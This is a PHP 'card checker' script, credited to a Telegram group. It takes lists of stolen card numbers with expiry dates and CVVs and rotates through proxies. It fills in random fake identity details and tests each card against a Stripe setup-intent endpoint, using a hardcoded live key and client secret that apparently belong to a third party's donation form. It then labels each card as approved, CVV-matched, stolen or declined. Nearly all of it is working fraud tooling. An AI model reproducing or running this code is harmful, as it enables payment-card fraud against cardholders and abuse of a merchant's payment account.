<?php


/// Made by 𝒁𝒆𝒍𝒕彡𝑨𝒅𝒂𝒓𝒔𝒉𝒀𝑻【★🆉🆁™】
/// Join @ZeltraxRockz & @ZeltraxChat for more...
/// This is raw api.. :)
/// Add ur Proxies in zeltproxy.txt

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
function binsforeveryoneproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = binsforeveryoneproxys();
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

if(file_exists(getcwd().('/cookie.txt'))){
  @unlink('cookie.txt'); 
}

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$first = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];
/////////////////////////////////////BIN LOOKUP START////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);

$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');

 if(strpos($fim, '"type":"credit"') !== false) {
  $bin = 'Credito';
} else {
  $bin = 'Debito';
}
/////////////////////////////////////BIN LOOKUP END////////////////////////////////////////////////////////////////

//---------------------------------------------------------------------------------------------------------------------------------------------//

////////////////////////////////////===[For Authorizing Cards]////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/seti_1H6aP9KfKAFTFCjeIsmV6Ge8/confirm');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'Accept: application/json',
'Accept-Language: en-US',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://js.stripe.com',
'Referer: https://js.stripe.com/v3/controller-99bba1095c593b22e6fcf895bcc6cce2.html'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
//=============================================================================================================================================//
//=============================================================================================================================================//
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=NA&payment_method_data[muid]=ae30cef0-82aa-4b18-9cb4-6eda85dba580&payment_method_data[sid]=891257b6-72c2-4755-86b4-33df42942309&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F60fdab8a%3B+stripe-js-v3%2F60fdab8a&payment_method_data[time_on_page]=28893&payment_method_data[referrer]=https%3A%2F%2Farochanz.infoodle.com%2Fform_process%3Fg%3Df9bbc808-ad0d-449d-a894-ae618a078325&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_x0obrrtkYsScMFbtGnXTn7v5&client_secret=seti_1H6aP9KfKAFTFCjeIsmV6Ge8_secret_HfwHK6IiHpaznfVWLh61c0yveQRFkzA');
//=============================================================================================================================================//
//=============================================================================================================================================//
$result = curl_exec($ch);
$monsage = trim(strip_tags(getStr($result,'"message":"','"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];

////////////////////////////===[Card Response Start]///////////////////////////////////////////////////

if(strpos($result, '"cvc_check": "pass"')){

  echo "<font size=5 color='green'><font class='badge badge-success'>Aprovada ♛FLACKO♛ <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='green'><font class='badge badge-success'>CVV MATCHED</i></font> <font class='badge badge-green'>[♛LORD PRETTY FLACKO♛]</i></font><br>";

  }
  elseif(strpos($result, "Thank You For Donation." )) {
  echo "<font size=5 color='green'><font class='badge badge-success'>Aprovada ♛FLACKO♛ <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='green'><font class='badge badge-success'>CVV MATCHED</i></font> <font class='badge badge-green'>[♛LORD PRETTY FLACKO♛]</i></font><br>";
  }
  elseif(strpos($result, "Thank You." )) {
  echo "<font size=5 color='green'><font class='badge badge-success'>Aprovada ♛FLACKO♛ <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='green'><font class='badge badge-success'>SUCCESS CHARGED</i></font> <font class='badge badge-green'>[♛LORD PRETTY FLACKO♛]</i></font><br>";
  }
  elseif(strpos($result,'"status": "succeeded"')){
      echo "<font size=5 color='green'><font class='badge badge-success'>Aprovada ♛FLACKO♛ <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='green'><font class='badge badge-success'>SUCCESSFULLY CHARGED</i></font> <font class='badge badge-green'>[♛LORD PRETTY FLACKO♛]</i></font><br>";
  }
  elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo "<font size=5 color='green'><font class='badge badge-success'>Aprovada ♛FLACKO♛ <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='green'><font class='badge badge-success'>CVV - INCORRECT ZIP</i></font> <font class='badge badge-green'>[♛LORD PRETTY FLACKO♛]</i></font><br>";
  }
  elseif(strpos($result, "incorrect_zip" )) {
  echo "<font size=5 color='green'><font class='badge badge-success'>Aprovada ♛FLACKO♛ <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='green'><font class='badge badge-success'>CVV - INCORRECT ZIP</i></font> <font class='badge badge-green'>[♛LORD PRETTY FLACKO♛]</i></font><br>";
  }
  elseif(strpos($result, "Success" )) {
  echo "<font size=5 color='green'><font class='badge badge-success'>Aprovada ♛FLACKO♛ <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='green'><font class='badge badge-success'>SUCCESSFULY CHARGED</i></font> <font class='badge badge-green'>[♛LORD PRETTY FLACKO♛]</i></font><br>";
  }
  elseif(strpos($result, "succeeded." )) {
  echo "<font size=5 color='green'><font class='badge badge-success'>Aprovada ♛FLACKO♛ <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='green'><font class='badge badge-success'>SUCCESSFULLY CHARGED</i></font> <font class='badge badge-green'>[♛LORD PRETTY FLACKO♛]</i></font><br>";
  }
  elseif(strpos($result,'"type":"one-time"')){
  echo "<font size=5 color='green'><font class='badge badge-success'>Aprovada ♛FLACKO♛ <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='green'><font class='badge badge-success'>CVV MATCHED</i></font> <font class='badge badge-green'>[♛LORD PRETTY FLACKO♛]</i></font><br>";
  }
  elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo "<font size=5 color='green'><font class='badge badge-success'>Aprovada ♛FLACKO♛ <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='green'><font class='badge badge-success'>INSUFFICIENT FUNDS</i></font> <font class='badge badge-green'>[♛LORD PRETTY FLACKO♛]</i></font><br>";
  }
  elseif(strpos($result, "insufficient_funds")) {
  echo "<font size=5 color='green'><font class='badge badge-success'>Aprovada ♛FLACKO♛ <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='green'><font class='badge badge-success'>INSUFFICIENT FUNDS</i></font> <font class='badge badge-green'>[♛LORD PRETTY FLACKO♛]</i></font><br>";
  }
  elseif(strpos($result, "lost_card" )) {
  echo "<font size=5 color='green'><font class='badge badge-warning'>Aprovada ♛FLACKO♛ <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='green'><font class='badge badge-warning'>LOST CARD</i></font> <font class='badge badge-green'>[♛LORD PRETTY FLACKO♛]</i></font><br>";
  }
  elseif(strpos($result, "stolen_card" )) {
  echo "<font size=5 color='green'><font class='badge badge-warning'>Aprovada ♛FLACKO♛ <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='green'><font class='badge badge-warning'>STOLEN CARD</i></font> <font class='badge badge-green'>[♛LORD PRETTY FLACKO♛]</i></font><br>";
  }
  elseif(strpos($result, "Your card's security code is incorrect.")) {
  echo "<font size=5 color='green'><font class='badge badge-light'>>Aprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-danger'>CCN MATCHED</i></font> <font class='badge badge-light'>[♛LORD PRETTY FLACKO♛]</i></font><br>";
  }
  elseif(strpos($result, "incorrect_cvc" )) {
  echo "<font size=5 color='green'><font class='badge badge-success'>Aprovada ♛FLACKO♛ <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='green'><font class='badge badge-light'>CCN MATCHED</i></font> <font class='badge badge-green'>[♛LORD PRETTY FLACKO♛]</i></font><br>";
  }
  elseif(strpos($result, "pickup_card" )) {
  echo "<font size=5 color='green'><font class='badge badge-warning'>Aprovada ♛FLACKO♛ <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='green'><font class='badge badge-warning'>STOLEN OR LOST</i></font> <font class='badge badge-green'>[♛LORD PRETTY FLACKO♛]</i></font><br>";
  }
  elseif(strpos($result, 'Your card has expired.' )) {
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-danger'>CARD EXPIRED</i></font><br>";
  }
  elseif(strpos($result, "expired_card" )) {
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-danger'>CARD EXPIRED</i></font><br>";
  }
  elseif(strpos($result, 'Your card number is incorrect.')) {
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i></font><br>";
  }
  elseif(strpos($result, "incorrect_number")) {
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i></font><br>";
  }
  elseif(strpos($result, "service_not_allowed")) {
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-danger'>SERVICE NOT ALLOWED</i></font><br>";
  }
  elseif(strpos($result, "do_not_honor")) {
  echo "<font size=5 color='green'><font class='badge badge-warning'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-warning'>DO NOT HONOR</i></font><br>";
  }
  elseif(strpos($result, "generic_decline")) {
  echo "<font size=5 color='green'><font class='badge badge-warning'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-warning'>GENERIC DECLINED</i></font><br>";
  }
  elseif(strpos($result, 'Your card was declined.')) {
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-danger'>CARD DECLINED</i></font><br>";
  }
  elseif(strpos($result, "generic_decline")) {
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-danger'>GENERIC DECLINED</i></font><br>";
  }
  elseif(strpos($result, '"cvc_check": "unchecked"')) {
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-danger'>CVC UNCHECKED BEWARE !! !!!</i></font><br>";
  }
  elseif(strpos($result, '"cvc_check": "unavailable"')) {
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-danger'>CVC UNCHECKED BEWARE !! !!!</i></font><br>";
  }
  elseif(strpos($result,'"cvc_check": "fail"')){
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-warning'>CVC_CHECKED : Fail</i></font><br>";
  }
  elseif(strpos($result,"parameter_invalid_empty")){
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-danger'>MISSING CARD DETAIL</i></font><br>";
  }
  elseif(strpos($result,"lock_timeout")){
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-warning'>CARD NOT CHECK</i></font><br>";
  }
  elseif (strpos($result, 'Your card does not support this type of purchase.')) {
  echo "<font size=5 color='green'><font class='badge badge-red'>Aprovada ♛FLACKO♛ <i class='zmdi zmdi-check'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-brown'>CARD NOT SUPPORTED</i></font><br>";
  }
  elseif(strpos($result,"transaction_not_allowed")){
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-danger'>CARD NOT SUPPORTED</i></font><br>";
  }
  elseif(strpos($result,"three_d_secure_redirect")){
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-danger'>CARD NOT SUPPORTED</i></font><br>";
  }
  elseif(strpos($result, 'Card is declined by your bank, please contact them for additional primaryrmation.')) {
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-danger'>3D SECURED</i></font><br>";
  }
  elseif(strpos($result,"missing_payment_primaryrmation")){
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-danger'>MISSING PAYMENT PRIMARYRMATION</i></font><br>";
  }
  elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-danger'>MISSING CREDIT CARD NUMBER</i></font><br>";
}
elseif(strpos($result, "card_not_supported")) {
  echo "<font size=5 color='green'><font class='badge badge-warning'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-warning'>CARD NOT SUPPORTED</i></font><br>";
}
elseif(strpos($result, 'Your card is not supported.')) {
  echo "<font size=5 color='green'><font class='badge badge-warning'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-warning'>CARD NOT SUPPORTED</i></font><br>";
}
elseif(strpos($result, 'fraudulent')) {
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-danger'>Fraudulent</i></font><br>";
}
else {
  echo "<font size=5 color='green'><font class='badge badge-danger'>Reprovada ♛FLACKO♛ <i class='zmdi zmdi-close'></i></font> $cc|$mes|$ano|$cvv <font size=5 color='red'><font class='badge badge-danger'>Server Failure/Error Not Listed</i></font><br>";
}

curl_close($ch);
//echo $result;
ob_flush();


?>
